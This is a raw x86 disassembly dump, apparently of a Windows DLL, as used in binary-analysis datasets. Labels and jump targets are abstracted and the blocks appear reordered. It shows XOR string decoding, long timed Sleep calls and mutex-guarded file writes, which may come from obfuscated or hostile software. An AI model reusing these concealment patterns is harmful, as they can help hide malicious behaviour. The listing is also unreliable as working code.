mov ecx [ edi + 0x8 ]
cmp eax ecx
jne r-xdata
mov edx [ edi ]
cmp edx ecx
ja r-xdata
mov eax [ edi + 0x4 ]
mov [ ebp - 0x304 ] eax
mov [ ebp - 0x2e4 ] eax
mov [ ebp - 0x4 ] 0x4
test eax eax
je r-xdata
mov edx [ edi ]
sub eax edx
sar eax 0x7
cmp eax 0x1fffffe
ja r-xdata
mov ebx ecx
mov ecx [ edi + 0x8 ]
sub ebx edx
cmp eax ecx
jne r-xdata
mov [ ebp - 0x4 ] 0x2
sub [ edi + 0x4 ] 0xffffff80
inc [ ebp - 0x2e8 ]
inc [ ebp - 0x2dd ]
mov ebx [ ebp - 0x2fc ]
lea edi [ ebp - 0x2dc ]
push r--data
call sub_10030594
sub ecx edx
inc eax
sar ecx 0x7
cmp eax ecx
jbe r-xdata
mov eax [ edi + 0x4 ]
and ebx 0xffffff80
add ebx [ edi ]
mov [ ebp - 0x2e4 ] eax
mov [ ebp - 0x304 ] eax
mov [ ebp - 0x4 ] 0x3
test eax eax
je r-xdata
sub eax edx
sar eax 0x7
cmp eax 0x1fffffe
ja r-xdata
mov edx ecx
shr edx 0x1
mov ebx 0x1ffffff
sub ebx edx
cmp ebx ecx
jae r-xdata
mov edi ebx
jmp r-xdata
sub ecx edx
inc eax
sar ecx 0x7
cmp eax ecx
jbe r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
push eax
call sub_1000a880
mov edi [ ebp - 0x2f0 ]
mov edx ecx
shr edx 0x1
mov esi 0x1ffffff
sub esi edx
cmp esi ecx
jae r-xdata
push ecx
mov ecx edi
call sub_100126d0
mov ecx eax
cmp ecx eax
jae r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
push ecx
mov ecx edi
call sub_100126d0
mov esi [ ebp - 0x2e4 ]
mov ecx eax
cmp ecx eax
jae r-xdata
sub_10022b50
push ebp
mov ebp esp
push 0xffffffff
push sub_100887d0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x64
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
movzx esi cx
xor eax eax
xor ecx ecx
mov edi edx
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x2c ] cx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
call [ GetProcessHeap@IAT ]
mov ebx eax
mov eax [ rw-data ]
mov [ ebp - 0x50 ] ebx
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x2c ]
push eax
lea edx [ ebp - 0x48 ]
push edx
mov ecx edi
mov edx esi
call sub_100487d0
add esp 0x4
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_10033f90
mov edi 0x8
cmp [ ebp - 0x34 ] edi
jb r-xdata
mov esi [ ebp - 0x1c ]
add esi esi
lea ecx [ esi + 0x1 ]
push ecx
push edi
push ebx
call [ HeapAlloc@IAT ]
mov [ ebp - 0x5c ] eax
cmp [ ebp - 0x18 ] edi
jb r-xdata
mov eax [ ebp - 0x48 ]
push eax
call sub_1000a86e
add esp 0x4
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4c ] ecx
mov edx [ ebp - 0x2c ]
mov [ ebp - 0x4c ] edx
jmp r-xdata
mov ecx [ rw-data ]
push ecx
call [ ReleaseMutex@IAT ]
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
cmp esi [ ebp - 0x58 ]
jne r-xdata
lea edx [ ebp - 0x68 ]
mov [ ebp - 0x54 ] eax
push edx
lea eax [ ebp - 0x54 ]
push eax
lea ecx [ ebp - 0x4c ]
push ecx
lea edi [ ebp - 0x64 ]
lea edx [ ebp - 0x6c ]
lea ebx [ ebp - 0x60 ]
mov [ ebp - 0x60 ] esi
call sub_1002e250
mov edx [ rw-data ]
add esp 0xc
push 0xffffffff
push edx
call [ WaitForSingleObject@IAT ]
mov edi [ ebp - 0x5c ]
mov ecx [ rw-data ]
push 0x0
lea eax [ ebp - 0x58 ]
push eax
push esi
push edi
push ecx
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x2c ]
push edx
jmp r-xdata
mov edx [ rw-data ]
push edx
call [ ReleaseMutex@IAT ]
test edi edi
je r-xdata
call sub_1000a86e
add esp 0x4
lea ecx [ ebp - 0x2c ]
call sub_100702e0
jmp r-xdata
mov eax [ ebp - 0x50 ]
push edi
push 0x0
push eax
call [ HeapFree@IAT ]
sub_10022ce0
push ebp
mov ebp esp
push 0xffffffff
push sub_10088401
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi [ r--data ]
mov edi ecx
mov [ ebp - 0xd4 ] eax
xor cl cl
xor eax eax
mov dl [ eax + esi ]
xor dl cl
xor dl 0xba
inc cl
mov [ ebp + eax - 0x1c ] dl
movzx eax cl
cmp eax 0x8
jb r-xdata
push 0x8
push 0x0
lea eax [ ebp - 0x38 ]
push eax
mov ecx edi
mov [ ebp - 0x14 ] 0x0
call sub_10028bd0
lea ecx [ ebp - 0x1c ]
lea esi [ ecx + 0x1 ]
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx esi
mov esi [ eax + 0x10 ]
mov ebx ecx
mov ecx esi
cmp esi ebx
jb r-xdata
cmp [ eax + 0x14 ] 0x10
jb r-xdata
mov ecx ebx
push ecx
lea ecx [ ebp - 0x1c ]
push ecx
push eax
call sub_100021f0
add esp 0xc
test eax eax
jne r-xdata
mov eax [ eax ]
sete bl
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x24 ] 0x10
jb r-xdata
cmp esi ebx
jae r-xdata
mov esi [ r--data ]
xor eax eax
test bl bl
setne al
xor cl cl
mov [ ebp - 0xd0 ] eax
xor eax eax
mov edx [ ebp - 0x38 ]
push edx
call sub_1000a86e
add esp 0x4
xor eax eax
cmp esi ebx
setne al
or eax 0xffffffff
jmp r-xdata
mov dl [ eax + esi ]
xor dl cl
xor dl 0xd6
inc cl
mov [ ebp + eax - 0xcc ] dl
movzx eax cl
cmp eax 0x3
jb r-xdata
lea eax [ ebp - 0xcc ]
mov [ ebp - 0xc9 ] 0x0
lea edx [ eax + 0x1 ]
test eax eax
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push 0x0
lea eax [ ebp - 0xcc ]
push eax
mov ecx edi
call sub_100198e0
cmp eax 0xffffffff
je r-xdata
mov ebx 0x10
push 0xffffffff
add eax 0x3
push eax
lea ecx [ ebp - 0x38 ]
push ecx
mov ecx edi
call sub_10028bd0
push eax
mov ecx edi
mov [ ebp - 0x4 ] 0x1
call sub_1003acf0
mov ebx 0x10
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x24 ] ebx
jb r-xdata
push esi
push 0x0
lea ecx [ ebp - 0xa8 ]
push ecx
mov ecx edi
call sub_10028bd0
push 0xffffffff
inc esi
push esi
lea edx [ ebp - 0x38 ]
push edx
mov ecx edi
mov [ ebp - 0x4 ] 0x2
call sub_10028bd0
push eax
mov ecx edi
mov [ ebp - 0x4 ] 0x3
call sub_1003acf0
cmp [ ebp - 0x24 ] ebx
jb r-xdata
mov eax 0x1
jmp r-xdata
push 0x1
push 0x0
lea eax [ ebp - 0xc8 ]
push eax
mov ecx edi
mov [ ebp - 0xc8 ] 0x2f
call sub_100198e0
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx [ ebp - 0x38 ]
push edx
call sub_1000a86e
add esp 0x4
jmp r-xdata
mov [ ebp - 0x78 ] 0xf
mov [ ebp - 0x7c ] 0x0
mov [ ebp - 0x8c ] 0x0
push 0x1
push 0x0
lea ecx [ ebp - 0xc8 ]
push ecx
mov [ ebp - 0x4 ] 0x4
lea ecx [ ebp - 0xa8 ]
mov [ ebp - 0xc8 ] 0x3a
call sub_100198e0
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebp - 0x38 ]
push eax
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
push 0xffffffff
lea edx [ esi + 0x1 ]
push edx
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0xa8 ]
call sub_10028bd0
push eax
lea ecx [ ebp - 0x8c ]
mov [ ebp - 0x4 ] 0x5
call sub_1003acf0
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x24 ] ebx
jb r-xdata
push 0x2
push r--data
lea ecx [ ebp - 0x8c ]
call sub_1003e780
xor esi esi
jmp r-xdata
push esi
xor esi esi
push esi
lea edx [ ebp - 0x38 ]
push edx
lea ecx [ ebp - 0xa8 ]
call sub_10028bd0
push eax
lea ecx [ ebp - 0xa8 ]
mov [ ebp - 0x4 ] 0x6
call sub_1003acf0
cmp [ ebp - 0x24 ] ebx
jb r-xdata
mov ecx [ ebp - 0x38 ]
push ecx
call sub_1000a86e
add esp 0x4
mov eax 0xf
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x44 ] esi
mov [ ebp - 0x54 ] 0x0
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x60 ] esi
mov [ ebp - 0x70 ] 0x0
lea ecx [ ebp - 0xc8 ]
mov [ ebp - 0x4 ] 0x8
push ecx
mov [ ebp - 0xc8 ] 0x2f
call sub_10038620
cmp eax 0xffffffff
jne r-xdata
mov eax [ ebp - 0x38 ]
push eax
call sub_1000a86e
add esp 0x4
lea esi [ eax + 0x1 ]
push esi
push 0x0
lea edx [ ebp - 0x38 ]
push edx
mov ecx edi
call sub_10028bd0
push eax
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x9
call sub_1003acf0
mov [ ebp - 0x4 ] 0x8
cmp [ ebp - 0x24 ] ebx
jb r-xdata
push eax
push esi
push edi
lea ecx [ ebp - 0x70 ]
mov [ ebp - 0x44 ] 0x1
mov [ ebp - 0x54 ] 0x2f
call sub_10037cf0
jmp r-xdata
push 0xffffffff
push esi
lea ecx [ ebp - 0xc4 ]
push ecx
mov ecx edi
call sub_10028bd0
push eax
lea ecx [ ebp - 0x70 ]
mov [ ebp - 0x4 ] 0xa
call sub_1003acf0
mov [ ebp - 0x4 ] 0x8
cmp [ ebp - 0xb0 ] ebx
jb r-xdata
mov eax [ ebp - 0x38 ]
push eax
call sub_1000a86e
add esp 0x4
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebp - 0xd4 ]
lea ecx [ ebp - 0xa8 ]
push ecx
lea edx [ ebp - 0xd0 ]
push edx
push eax
lea ecx [ ebp - 0x54 ]
lea edx [ ebp - 0x8c ]
call sub_10019f50
add esp 0x10
cmp [ ebp - 0x5c ] ebx
jb r-xdata
xor esi esi
mov edx [ ebp - 0xc4 ]
push edx
call sub_1000a86e
add esp 0x4
mov edi 0xf
mov [ ebp - 0x5c ] edi
mov [ ebp - 0x60 ] esi
mov [ ebp - 0x70 ] 0x0
cmp [ ebp - 0x40 ] ebx
jb r-xdata
mov ecx [ ebp - 0x70 ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x40 ] edi
mov [ ebp - 0x44 ] esi
mov [ ebp - 0x54 ] 0x0
cmp [ ebp - 0x78 ] ebx
jb r-xdata
mov edx [ ebp - 0x54 ]
push edx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x78 ] edi
mov [ ebp - 0x7c ] esi
mov [ ebp - 0x8c ] 0x0
cmp [ ebp - 0x94 ] ebx
jb r-xdata
mov eax [ ebp - 0x8c ]
push eax
call sub_1000a86e
add esp 0x4
xor eax eax
mov ecx [ ebp - 0xa8 ]
push ecx
call sub_1000a86e
add esp 0x4
sub_10023100
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push esi
push ebx
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push esi
push ebx
push eax
mov [ edi + 0x4 ] eax
call sub_1007f580
add esp 0xc
pop esi
retn
push eax
call [ LocalFree@IAT ]
mov [ edi + 0x4 ] 0x0
sub_10023140
push ebp
mov ebp esp
mov eax [ edi + 0xf4 ]
sub esp 0x8
push ebx
mov ebx [ WaitForSingleObject@IAT ]
push esi
push 0xffffffff
push eax
call ebx
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
je r-xdata
mov edx [ edi + 0xf4 ]
push edx
call [ ReleaseMutex@IAT ]
xor eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edi + 0xe8 ]
test ecx ecx
je r-xdata
mov edx [ edi + 0x4 ]
mov esi [ edi + 0x8 ]
mov eax edx
cmp eax esi
je r-xdata
cmp [ ecx + 0xd4 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] edx
cmp edx esi
je r-xdata
test ecx ecx
je r-xdata
mov eax [ edi + 0xf4 ]
push eax
call [ ReleaseMutex@IAT ]
mov eax [ edi + 0xe8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ edi + 0xf4 ]
mov esi [ ReleaseMutex@IAT ]
push edx
call esi
inc [ edi + 0xf0 ]
cmp [ edi + 0xf0 ] 0x3
jb r-xdata
lea ebx [ edi + 0x14 ]
add eax 0x4
cmp eax esi
jne r-xdata
cmp ecx [ eax ]
je r-xdata
mov ecx [ edi + 0xf4 ]
push 0xffffffff
push ecx
call ebx
mov edx [ edi + 0xf4 ]
push edx
mov [ edi + 0xe8 ] 0x0
call esi
mov eax [ edi + 0xf4 ]
push 0xffffffff
push eax
mov [ edi + 0xec ] 0x0
call ebx
cmp [ edi + 0xe8 ] 0x0
je r-xdata
push 0x0
mov [ edi + 0xc0 ] 0x0
call sub_10039e10
test eax eax
je r-xdata
push eax
call sub_10039e10
test eax eax
je r-xdata
jmp r-xdata
mov edx eax
mov eax [ edi + 0xf4 ]
push eax
mov [ edi + 0xec ] 0x1
call esi
lea ecx [ ecx ]
lea ecx [ edi + 0x14 ]
push ecx
mov [ edi + 0xec ] 0x1
mov [ edi + 0xf0 ] 0x0
call [ LeaveCriticalSection@IAT ]
mov edx [ edi + 0xf4 ]
push edx
call [ ReleaseMutex@IAT ]
mov eax [ edi + 0xe8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
mov [ edi + 0xc0 ] 0x1
call sub_10039e10
test eax eax
je r-xdata
mov ecx [ edi + 0xf4 ]
push ecx
call esi
push 0x1b7740
call [ Sleep@IAT ]
mov edx [ edi + 0xf4 ]
push 0xffffffff
push edx
call ebx
cmp [ edi + 0xe8 ] 0x0
jne r-xdata
push 0x2
mov [ edi + 0xc0 ] 0x2
call sub_10039e10
test eax eax
je r-xdata
mov ecx [ edi + 0xe8 ]
mov [ edi + 0xc0 ] 0x3
push ebx
mov [ ecx + 0xd4 ] 0x0
call [ LeaveCriticalSection@IAT ]
mov edx [ edi + 0xf4 ]
mov esi [ ReleaseMutex@IAT ]
push edx
call esi
push 0x927c0
call [ Sleep@IAT ]
mov eax [ edi + 0xf4 ]
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
cmp [ edi + 0xe8 ] 0x0
je r-xdata
mov ecx [ edi + 0xf4 ]
push ecx
call esi
mov ebx [ WaitForSingleObject@IAT ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x4
mov [ ebp - 0x4 ] eax
cmp eax [ edi + 0x8 ]
jne r-xdata
mov eax [ edi + 0xf4 ]
push 0xffffffff
push eax
call ebx
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
push ebx
mov [ edi + 0xe8 ] eax
call [ EnterCriticalSection@IAT ]
mov eax [ edi + 0xc0 ]
mov esi [ edi + 0xe8 ]
cmp eax 0x3
je r-xdata
mov ebx [ WaitForSingleObject@IAT ]
sub_100233c0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push 0xc4
push edi
call sub_10013bb0
mov esi eax
mov [ edi + 0x8 ] esi
xor ebx ebx
mov [ esi ] ebx
lea ecx [ esi + 0x10 ]
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0x70 ] 0x96
mov eax [ r--data ]
push ecx
push edi
mov [ esi + 0xc ] eax
call sub_100503f0
lea edx [ esi + 0x20 ]
push edx
push edi
mov [ esi + 0x1c ] ebx
call sub_100503f0
mov eax [ ebp + 0xc ]
lea ecx [ esi + 0x94 ]
push ecx
mov [ ebp + 0x8 ] ecx
mov ecx [ ebp + 0x10 ]
push ecx
push eax
push edi
mov [ esi + 0x2c ] eax
call sub_10028e60
mov edx [ ebp + 0x8 ]
add esi 0x30
push esi
push edx
call sub_10012bd0
mov eax [ edi + 0x8 ]
add esp 0x30
pop edi
pop esi
mov [ eax + 0x7c ] ebx
mov [ eax + 0x80 ] ebx
mov [ eax + 0x84 ] ebx
mov [ eax + 0x88 ] ebx
mov [ eax + 0x8c ] ebx
mov [ eax + 0x90 ] ebx
pop ebx
pop ebp
retn
sub_10023460
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x1c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop ebx
pop ebp
retn
push esi
push edi
mov edi [ ebp + 0x18 ]
mov [ ebp + 0x10 ] 0x1
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
movzx edx [ edi ]
je r-xdata
test ecx ecx
je r-xdata
pop edi
pop esi
mov eax [ ecx ]
push edx
mov edx [ eax + 0xc ]
call edx
movzx eax ax
mov eax [ ecx + 0x34 ]
cmp [ eax ] 0x0
jle r-xdata
add edi 0x2
dec ebx
jne r-xdata
dec [ eax ]
mov eax [ ecx + 0x24 ]
mov ecx [ eax ]
lea esi [ ecx + 0x2 ]
mov [ eax ] esi
mov [ ecx ] dx
mov eax edx
jmp r-xdata
mov ecx 0xffff
cmp cx ax
mov ecx [ ebp + 0x14 ]
jne r-xdata
sub_100234cf
push 0x4c
mov eax sub_100851da
call sub_10047689
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x18 ]
mov edi [ ebp + 0x24 ]
mov esi [ ebp + 0x20 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x50 ] eax
mov al [ ebp + 0x1c ]
mov [ ebp - 0x3c ] al
lea eax [ ebp - 0x58 ]
push eax
mov ecx ebx
mov [ ebp - 0x30 ] edi
call sub_10007a10
and [ ebp - 0x4 ] 0x0
push eax
call sub_10067ab7
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x58 ]
mov [ ebp - 0x54 ] eax
call sub_1002be90
mov ecx [ ebp - 0x54 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10026407
mov al [ esi ]
xor ecx ecx
inc ecx
mov [ ebp - 0x4 ] ecx
cmp al 0x2b
je r-xdata
mov [ ebp - 0x34 ] ecx
cmp al 0x2d
je r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
cmp al 0x30
jne r-xdata
cmp [ ebx + 0x24 ] 0x0
mov edi [ ebx + 0x20 ]
jl r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax ecx
jae r-xdata
and [ ebp - 0x34 ] 0x0
jmp r-xdata
mov al [ esi + 0x1 ]
cmp al 0x78
je r-xdata
xor edi edi
jg r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
mov ecx [ ebp - 0x2c ]
mov eax ecx
jae r-xdata
mov [ ebp - 0x34 ] 0x2
jmp r-xdata
cmp al 0x58
jne r-xdata
mov ecx [ ebp - 0x54 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
mov [ ebp - 0x40 ] al
push [ ebp - 0x40 ]
lea eax [ ebp - 0x4c ]
push [ ebp - 0x30 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push [ ebp - 0x38 ]
call sub_1000f514
mov ecx [ eax ]
push edi
push [ ebp - 0x3c ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
push eax
push ecx
push [ ebp - 0x50 ]
xor esi esi
push [ ebp - 0x38 ]
mov [ ebp + 0x14 ] eax
mov [ ebx + 0x20 ] esi
mov [ ebx + 0x24 ] esi
call sub_10019146
add esp 0x34
push esi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10005b50
mov eax [ ebp - 0x50 ]
call sub_100262c3
retn
cmp eax 0x100
lea eax [ ebp - 0x44 ]
je r-xdata
cmp edi [ ebp - 0x30 ]
jbe r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push [ ebp - 0x34 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push [ ebp - 0x38 ]
call sub_100293e8
mov ecx [ eax ]
add esi [ ebp - 0x34 ]
push edi
push [ ebp - 0x3c ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
mov ecx [ ebp - 0x34 ]
push [ eax ]
sub [ ebp - 0x30 ] ecx
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x38 ]
call sub_10019146
add esp 0x30
push edi
push [ ebp - 0x3c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push [ ebp - 0x38 ]
call sub_10019146
add esp 0x18
jmp r-xdata
sub edi [ ebp - 0x30 ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
jmp r-xdata
mov [ ebp - 0x48 ] ecx
jmp r-xdata
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
xor edi edi
mov [ ebp + 0x14 ] eax
mov eax [ ebx + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x48 ]
mov al [ eax ]
cmp al 0x7f
jne r-xdata
test al al
jle r-xdata
mov ecx edi
sub ecx [ ebp - 0x34 ]
movsx eax al
cmp eax ecx
jae r-xdata
sub edi eax
mov eax [ ebp - 0x30 ]
sub eax edi
inc eax
push eax
lea ecx [ esi + edi ]
push ecx
push eax
lea eax [ esi + edi + 0x1 ]
push eax
mov [ ebp - 0x40 ] ecx
call sub_10061520
mov eax [ ebp - 0x40 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x48 ]
add esp 0x10
inc [ ebp - 0x30 ]
inc eax
cmp [ eax ] 0x0
jle r-xdata
sub_100236d0
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x1ffffff
ja r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10032538
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_10055e2a
shl ecx 0x7
push ecx
call sub_1002e3ac
add esp 0x4
test eax eax
jne r-xdata
sub_10023720
push ebp
mov ebp esp
push 0xffffffff
push sub_100891eb
mov eax [ fs : 0x0 ]
push eax
sub esp 0xd0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
call [ GetCurrentThreadId@IAT ]
cmp [ esi + 0x374 ] eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc0 ]
mov eax 0x156
call sub_10069020
xor eax eax
mov [ ebp - 0xdc ] ax
mov eax edx
mov [ ebp - 0xc8 ] 0x7
mov [ ebp - 0xcc ] 0x0
lea edx [ eax + 0x2 ]
nop
xor eax eax
jmp r-xdata
push sub_10027710
push sub_10040dc0
push 0x0
push eax
mov eax [ esi + 0x394 ]
mov [ esi + 0x40 ] 0x0
call eax
add esp 0x10
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea ecx [ ebp - 0xc0 ]
push ecx
lea ecx [ ebp - 0xdc ]
call sub_10034100
lea edx [ ebp - 0xdc ]
mov ecx 0x6
mov [ ebp - 0x4 ] 0x0
call sub_10022b50
cmp [ ebp - 0xc8 ] 0x8
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0xdc ]
push edx
call sub_1000a86e
add esp 0x4
sub_10023830
push ebp
mov ebp esp
push ecx
push edi
mov edi ecx
sub eax edi
mov ecx eax
and ecx 0xfffffffc
cmp ecx 0x4
jle r-xdata
pop edi
mov esp ebp
pop ebp
retn
push esi
mov edx [ edi + eax - 0x4 ]
mov ecx [ edi ]
lea esi [ eax - 0x4 ]
mov [ edi + eax - 0x4 ] ecx
mov [ ebp - 0x4 ] edx
push ebx
lea edx [ ebp - 0x4 ]
mov eax esi
sar eax 0x2
push edx
push eax
xor eax eax
call sub_10021720
mov eax esi
mov ecx esi
and ecx 0xfffffffc
add esp 0xc
cmp ecx 0x4
jg r-xdata
pop esi
sub_1002387b
push 0xc
push r--data
call sub_1007fad0
call sub_1002d269
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_1002f3c9
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10023916
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_1007fb15
retn
push 0x20
call sub_1004929a
cmp esi rw-data
je r-xdata
push esi
call sub_1001b2d2
pop ecx
sub_1002391f
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001e8ee
add esp 0x14
pop ebp
retn 0x10
sub_10023960
push ebp
mov ebp esp
sub esp 0x118
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
xor edi edi
mov esi ecx
mov ecx [ r--data ]
mov ebx edx
mov [ ebp - 0xf8 ] edi
mov [ ebp - 0x104 ] edi
xor eax eax
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x36
and edx 0xff
mov [ ebp + eax * 2 - 0xc ] dx
inc eax
cmp eax 0x2
jb r-xdata
lea ecx [ ebp - 0x104 ]
push ecx
lea edx [ ebp - 0xc ]
xor eax eax
push edx
mov [ ebp - 0x8 ] ax
call sub_1004e270
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax 0xc
mov [ ebp - 0xfc ] edi
call sub_1002f620
lea eax [ ebp - 0xfc ]
push eax
mov ecx edx
push ecx
call sub_1004e270
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xf4 ]
mov eax 0x75
call sub_1002f620
mov [ ebp - 0xf8 ] 0x1
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax 0x101
mov [ ebp - 0x108 ] edi
call sub_1002f620
lea edx [ ebp - 0x108 ]
push edx
lea eax [ ebp - 0x18 ]
push eax
call sub_1004e270
add esp 0x8
test eax eax
je r-xdata
mov [ ebp - 0xfc ] edi
mov eax [ ebp - 0x104 ]
mov esi [ SysFreeString@IAT ]
push eax
call esi
mov ecx [ ebp - 0x108 ]
push ecx
call esi
mov edx [ ebp - 0x110 ]
push edx
call esi
mov eax [ ebp - 0x118 ]
push eax
call esi
mov ecx [ ebp - 0x114 ]
push ecx
call esi
mov edx [ ebp - 0x10c ]
push edx
call esi
mov eax [ ebp - 0x100 ]
push eax
call esi
mov eax [ ebp - 0xfc ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0x48 ]
mov eax 0xab
mov [ ebp - 0x110 ] edi
call sub_1002f620
lea ecx [ ebp - 0x110 ]
push ecx
push edx
call sub_1004e270
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xec ]
mov eax 0xa4
call sub_1002f620
mov [ ebp - 0xf8 ] 0x2
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0xf8 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn
push eax
call esi
lea edx [ ebp - 0x5c ]
